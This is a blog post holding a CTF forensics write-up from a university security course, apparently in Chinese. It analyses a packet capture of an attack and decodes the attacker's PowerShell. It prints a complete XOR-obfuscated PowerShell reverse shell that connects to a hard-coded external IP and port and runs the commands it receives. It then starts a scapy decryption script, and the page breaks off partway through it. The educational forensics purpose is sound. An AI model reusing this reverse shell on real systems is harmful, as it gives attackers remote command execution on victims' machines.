<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>[NSYSU 駭客攻防] HW 0x01 Writeup - Cyris&#39;s Blog</title><meta name="Description" content="This is Cyris&#39;s blog, recording life and sharing security learning."><meta property="og:url" content="https://blog.cyris.tw/posts/2020/nsysu-htcf-hw1/">
  <meta property="og:site_name" content="Cyris&#39;s Blog">
  <meta property="og:title" content="[NSYSU 駭客攻防] HW 0x01 Writeup">
  <meta property="og:description" content="Writeups 搬自 MacacaHub HTCF HW 0x01 - Reverse Shell
Author: @stavhaygn
Writeup By: @yctseng1227
">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-11-03T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-11-03T00:00:00+00:00">
    <meta property="article:tag" content="NSYSU 駭客攻防">
    <meta property="article:tag" content="CTF-Writeup">
    <meta property="og:image" content="https://blog.cyris.tw/img/cyris.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.cyris.tw/img/cyris.png"><meta name="twitter:title" content="[NSYSU 駭客攻防] HW 0x01 Writeup">
<meta name="twitter:description" content="Writeups 搬自 MacacaHub HTCF HW 0x01 - Reverse Shell
Author: @stavhaygn
Writeup By: @yctseng1227">
      <meta name="twitter:site" content="@yctseng1227">
<meta name="application-name" content="Cyris&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Cyris&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/img/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.cyris.tw/posts/2020/nsysu-htcf-hw1/" /><link rel="prev" href="https://blog.cyris.tw/posts/2020/2020-summer-conf-p3/" /><link rel="next" href="https://blog.cyris.tw/posts/2020/nsysu-htcf-midterm-writeups/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "[NSYSU 駭客攻防] HW 0x01 Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.cyris.tw\/posts\/2020\/nsysu-htcf-hw1\/"
        },"image": ["https:\/\/blog.cyris.tw\/img\/cyris.png"],"genre": "posts","keywords": "NSYSU 駭客攻防, CTF-Writeup","wordcount":  701 ,
        "url": "https:\/\/blog.cyris.tw\/posts\/2020\/nsysu-htcf-hw1\/","datePublished": "2020-11-03T00:00:00+00:00","dateModified": "2020-11-03T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "Cyris","logo": "https:\/\/blog.cyris.tw\/img\/cyris.png"},"author": {
                "@type": "Person",
                "name": "Cyris"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Cyris&#39;s Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/img/favicon.ico"
        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
        data-sizes="auto"
        alt="/img/favicon.ico"
        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="#" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Cyris&#39;s Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/img/favicon.ico"
        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
        data-sizes="auto"
        alt="/img/favicon.ico"
        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="#" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[NSYSU 駭客攻防] HW 0x01 Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://blog.cyris.tw" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Cyris</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-cyber-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>資訊安全 Cyber Security</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-11-03">2020-11-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;701 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#reverse-shell-250-points">reverse shell (250 points)</a>
      <ul>
        <li><a href="#description">Description</a></li>
        <li><a href="#solution">Solution</a></li>
        <li><a href="#problem">Problem</a></li>
        <li><a href="#extra">Extra</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>Writeups 搬自 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/HTCF-CTF-2020/hw1/readme.md" target="_blank" rel="noopener noreffer ">MacacaHub HTCF HW 0x01 - Reverse Shell</a></p>
<p>Author: <strong>@stavhaygn</strong><br>
Writeup By: <strong>@yctseng1227</strong></p>
<br>
<h2 id="reverse-shell-250-points">reverse shell (250 points)</h2>
<h3 id="description">Description</h3>
<p>我架的破爛網站似乎被攻擊啦~!? 你能幫我從封包檔裡分析出駭客C2的IP、操作的指令、搜集到的資訊與被偷走的檔案內容(含 flag)嗎?</p>
<p>求求你了大大! QAQ ~ &lt;(_ _)&gt;</p>
<p><strong>Hint</strong>: powershell, reverse shell, symmetric encryption</p>
<h3 id="solution">Solution</h3>
<p>題目給定一封包檔 <code>.pcap</code> 進行分析，在封包數量不多的前提可以用 <code>Follow &gt; TCP stream</code> 把零碎的封包片段組起來方便查看，可以發現全部 14 筆 TCP stream 大部分都算是可讀資訊，但經過一段 PowerShell script 後，有一整段的封包完全不可讀（如圖）。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/01.png"
        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/01.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/01.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/01.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/01.png"
        title="wireshark-powershell_script" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/02.png"
        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/02.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/02.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/02.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/02.png"
        title="wireshark-encrypt_text" /></p>
<p>從 PowerShell 不難看出有經過 <a href="https://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener noreffer ">Base64</a> 混淆（注意最後的<code>%3D</code>其實就是 URL encode 的<code>=</code>），這題上線的前兩天恰好是中山資安社邀請講師<a href="https://stillu.cc" target="_blank" rel="noopener noreffer ">Still</a> 講過的 PowerShell 奇淫巧技，把 Base64 解開來後就跟社課一樣可以逐步分析。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/03.png"
        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/03.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/03.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/03.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/03.png"
        title="command_line-base64_decode" /></p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ol>
<li>建議可以用 VSCode 的 highlight 會好看很多 0w0</li>
<li>script 是以 <code>;</code> 作為語義上的結尾，所以可直接取代成換行<code>\n</code> (但要注意迴圈內的分號還是需要存在)</li>
<li>加密key <code>$xor_passwd</code> 中間那個是 &ldquo;0&rdquo; 不是 &ldquo;O&rdquo; &hellip; 如果寫錯會還原不完整xD</li>
</ol>
</div>
        </div>
    </div>
<div class="highlight" filename="payload.ps1"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">Get-Xor</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$xor_passwd</span> <span class="p">=</span> <span class="s2">&#34;x0R_&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$padding_xor_passwd</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$xor_passwd</span> <span class="p">*</span> <span class="p">[</span><span class="no">int</span><span class="p">](</span><span class="nv">$args</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="py">Length</span> <span class="p">/</span> <span class="nv">$xor_passwd</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="p">+</span> <span class="nv">$xor_passwd</span><span class="p">.</span><span class="py">Substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="nv">$args</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="py">Length</span> <span class="p">%</span> <span class="nv">$xor_passwd</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="mf">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span> <span class="p">=</span> <span class="vm">$</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$args</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="n">Length</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$args</span><span class="p">[</span><span class="mf">0</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span> <span class="o">-bxor</span> <span class="nv">$padding_xor_passwd</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="mf">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s2">&#34;45.79.159.73&#34;</span><span class="p">,</span> <span class="mf">39637</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="py">GetStream</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.65535</span><span class="p">|%{</span><span class="mf">0</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$command</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="py">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$command</span> <span class="p">=</span> <span class="nb">Get-Xor</span> <span class="nv">$command</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$command</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="p">=</span> <span class="nv">$response</span> <span class="p">+</span> <span class="s2">&#34;PS &#34;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="py">Path</span> <span class="p">+</span> <span class="s2">&#34;&gt; &#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="p">=</span> <span class="nb">GET-Xor</span> <span class="nv">$response</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">).</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$response</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$stream</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$response</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$stream</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$client</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>應該有不少人是拿到 PowerShell script 就直接拿去 Run，提醒一下在野生環境千萬不要這麼做，因為那等於是你幫駭客執行惡意程式 XDDD （助教非常扼腕應該要把 C&amp;C Server 開著等同學連進來後再幫對方彈個小算盤www）</p>
<p>關於上面這段 code ，總共可以分成兩個部分：</p>
<ol>
<li>
<p>單獨來看 Get-Xor function 其實就是拿 input 和 xor_passwd 做 XOR 運算，其中 xor_password 長度不足的部分就重複 padding，必要時可以開 PowerShell 測試。
要注意的是算出來的字串不一定都是可視字元（也不要直接把 wireshark 的 ASCII 字串手動複製==）。</p>
</li>
<li>
<p>從 line 13 開始是 C&amp;C Server 連線建立，在送出指令和接收資訊的時候分別做 Get-Xor 混淆，這也是為何 wireshark 有一整段都看不懂的原因。這段 script 其中 <code>iex</code> (<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7" target="_blank" rel="noopener noreffer ">Invoke-Expression</a>) 就是執行的部分，有點像 Python <code>eval</code> 這類的容易被駭客濫用的危險功能。</p>
</li>
</ol>
<br>
<p>知道混淆方式，那就有辦法還原啦！<br>
不知道各位是如何把密文 dump 出來，我個人是直接用 Python 把指定封包條件下的字串拿出來的同時順便解密~
這裡簡單說明一下 <a href="https://scapy.readthedocs.io/en/latest/" target="_blank" rel="noopener noreffer ">scapy</a> 套件的使用方式。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Python3</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">pkts</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="s1">&#39;./reverse_shell.pcap&#39;</span><span class="p">)</span> <span class="c1"># read pcap file</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">type</span><span class="p">(</span><span class="n">pkts</span><span class="p">)</span> <span class="c1"># check data tpye</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">Class</span> <span class="s1">&#39;scapy.plist.PacketList&#39;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">pkts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">show</span><span class="p">()</span> <span class="c1"># use show() or display() to see info in packet</span>
</span></span><span class="line"><span class="cl"><span class="c1">###[ Ethernet ]###</span>
</span></span><span class="line"><span class="cl">  <span class="n">dst</span>       <span class="o">=</span> <span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span>
</span></span><span class="line"><span class="cl">  <span class="n">src</span>       <span class="o">=</span> <span class="mi">08</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">8</span><span class="n">c</span><span class="p">:</span><span class="n">d3</span><span class="p">:</span><span class="n">ad</span>
</span></span><span class="line"><span class="cl">  <span class="nb">type</span>      <span class="o">=</span> <span class="n">IPv4</span>
</span></span><span class="line"><span class="cl"><span class="c1">###[ IP ]###</span>
</span></span><span class="line"><span class="cl">     <span class="n">version</span>   <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">     <span class="n">ihl</span>       <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">     <span class="n">tos</span>       <span class="o">=</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">     <span class="nb">len</span>       <span class="o">=</span> <span class="mi">229</span>
</span></span><span class="line"><span class="cl">     <span class="nb">id</span>        <span class="o">=</span> <span class="mi">29572</span>
</span></span><span class="line"><span class="cl">     <span class="n">flags</span>     <span class="o">=</span>
</span></span><span class="line"><span class="cl">     <span class="n">frag</span>      <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">     <span class="n">ttl</span>       <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">     <span class="n">proto</span>     <span class="o">=</span> <span class="n">udp</span>
</span></span><span class="line"><span class="cl">     <span class="n">chksum</span>    <span class="o">=</span> <span class="mh">0xad76</span>
</span></span><span class="line"><span class="cl">     <span class="n">src</span>       <span class="o">=</span> <span class="mf">10.0.2.15</span>
</span></span><span class="line"><span class="cl">     <span class="n">dst</span>       <span class="o">=</span> <span class="mf">10.0.2.255</span>
</span></span><span class="line"><span class="cl">     \<span class="n">options</span>   \
</span></span><span class="line"><span class="cl"><span class="c1">###[ UDP ]###</span>
</span></span><span class="line"><span class="cl">     <span class="n">sport</span>     <span class="o">=</span> <span class="n">netbios_dgm</span>
</span></span><span class="line"><span class="cl">     <span class="n">dport</span>     <span class="o">=</span> <span class="n">netbios_dgm</span>
</span></span><span class="line"><span class="cl">     <span class="nb">len</span>       <span class="o">=</span> <span class="mi">209</span>
</span></span><span class="line"><span class="cl">     <span class="n">chksum</span>    <span class="o">=</span> <span class="mh">0x19f0</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span> <span class="n">etc</span><span class="o">.</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">pkts</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">show</span><span class="p">()</span> <span class="c1"># show spectify field info following</span>
</span></span><span class="line"><span class="cl"><span class="c1">###[ IP ]###</span>
</span></span><span class="line"><span class="cl">     <span class="n">version</span>   <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">     <span class="n">ihl</span>       <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">     <span class="n">tos</span>       <span class="o">=</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">     <span class="nb">len</span>       <span class="o">=</span> <span class="mi">229</span>
</span></span><span class="line"><span class="cl">     <span class="nb">id</span>        <span class="o">=</span> <span class="mi">29572</span>
</span></span><span class="line"><span class="cl">     <span class="n">flags</span>     <span class="o">=</span>
</span></span><span class="line"><span class="cl">     <span class="n">frag</span>      <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">     <span class="n">ttl</span>       <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">     <span class="n">proto</span>     <span class="o">=</span> <span class="n">udp</span>
</span></span><span class="line"><span class="cl">     <span class="n">chksum</span>    <span class="o">=</span> <span class="mh">0xad76</span>
</span></span><span class="line"><span class="cl">     <span class="n">src</span>       <span class="o">=</span> <span class="mf">10.0.2.15</span>
</span></span><span class="line"><span class="cl">     <span class="n">dst</span>       <span class="o">=</span> <span class="mf">10.0.2.255</span>
</span></span><span class="line"><span class="cl">     \<span class="n">options</span>   \
</span></span><span class="line"><span class="cl"><span class="c1">###[ UDP ]###</span>
</span></span><span class="line"><span class="cl">     <span class="n">sport</span>     <span class="o">=</span> <span class="n">netbios_dgm</span>
</span></span><span class="line"><span class="cl">     <span class="n">dport</span>     <span class="o">=</span> <span class="n">netbios_dgm</span>
</span></span><span class="line"><span class="cl">     <span class="nb">len</span>       <span class="o">=</span> <span class="mi">209</span>
</span></span><span class="line"><span class="cl">     <span class="n">chksum</span>    <span class="o">=</span> <span class="mh">0x19f0</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span> <span class="n">etc</span><span class="o">.</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">pkts</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="c1"># show spectify field info </span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;10.0.2.15&#39;</span>
</span></span></code></pre></div><p>透過上述的用法就能拿來找指定 info ，以下 code 僅供參考。</p>
<div class="highlight" filename="solve.py"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pkts</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="s1">&#39;reverse_shell.pcap&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;out.raw&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">pkts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;IP&#39;</span> <span class="ow">in</span> <span class="n">p</span> <span class="ow">and</span> <span class="p">(</span> <span class="n">p</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="s1">&#39;45.79.159.73&#39;</span> <span class="ow">or</span> <span class="n">p</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="s1">&#39;45.79.159.73&#39;</span> <span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s1">&#39;Raw&#39;</span> <span class="ow">in</span> <span class="n">p</span> <span class="ow">and</span> <span class="p">(</span> <span class="n">p</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span><span class="o">==</span><span class="mi">39637</span> <span class="ow">or</span> <span class="n">p</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span><span class="o">==</span><span class="mi">39637</span> <span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="c1">#f.write(p[&#39;Raw&#39;].load)</span>
